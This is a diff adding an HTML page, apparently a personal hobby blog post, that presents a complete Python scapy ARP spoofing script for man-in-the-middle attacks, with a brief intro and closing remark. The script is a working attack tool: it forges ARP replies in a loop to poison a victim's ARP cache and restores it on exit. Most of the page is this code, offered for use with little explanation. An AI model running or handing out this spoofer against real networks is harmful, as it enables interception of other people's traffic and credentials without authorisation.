@@ -1,0 +1,71 @@
+<html>
+<head>
+<title>ARP Spoofer to be in the middle</title>
+</head>
+<body style="color:white;">
+<h3>ARP Spoofer to be in the middle</h3>
+<em>20/12/2020</em>
+  <!--Project-->
+<p>
+  <h4>Intro</h4>
+  <p>All of those thing could be alredy discovered.But,what i did is just developed my own script to perform MITM attack on the wire or the air.
+But,not only to ARP poisoning is the final step for the action.You have to understand much more.I just learned how to fool the AP & the victim inside the protocol.That's.
+  </p>
+  <h4>Source Code</h4>
+  <code>
+<pre>
+#!/usr/bin/python3
+import scapy.all as scapy
+import optparse
+
+
+print("ARP Spoofer\n16.12.2020\n************\n")
+
+try:
+    def get_args():
+        opt = optparse.OptionParser()
+        opt.add_option("-t","--target",dest="target",help="Specify the ip of victim")
+        opt.add_option("-s","--spoof",dest="spoof",help="IP of the target to spoof")
+        return opt.parse_args()[0]
+
+    ips = get_args()
+
+    def get_mac(ip):
+        ip = scapy.ARP(pdst=ip)
+        mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = mac/ip
+        response = scapy.srp(packet,timeout=1,verbose=False)[0]
+        return response[0][1].hwsrc
+
+    def arp(target,spoof):
+        mac = get_mac(target)
+        packet = scapy.ARP(op=2,pdst=target,hwdst=mac,psrc=spoof)
+        scapy.send(packet,verbose=False)
+
+    def arp_can(target,spoof):
+        mac1 = get_mac(target)
+        mac2 = get_mac(spoof)
+        packet = scapy.ARP(op=2,pdst=target,hwdst=mac1,psrc=spoof,hwsrc=mac2)
+        scapy.send(packet,verbose=False)
+
+    res = 2
+    try:
+        while True:
+            arp(ips.target,ips.spoof)
+            print(f"\rPacket send {res}",end="")
+            res += 2
+    except KeyboardInterrupt:
+        print("\nLeaving...")
+        arp_can(ips.target,ips.spoof)
+except Exception as error:
+    print(error)
+
+</pre>
+  </code>
+  <h4>Finality</h4>
+  <p>Hey you,Not just to run the code also try to understand the code.
+  </p>
+  -... -.. ...
+</p>
+</body>
+</html>
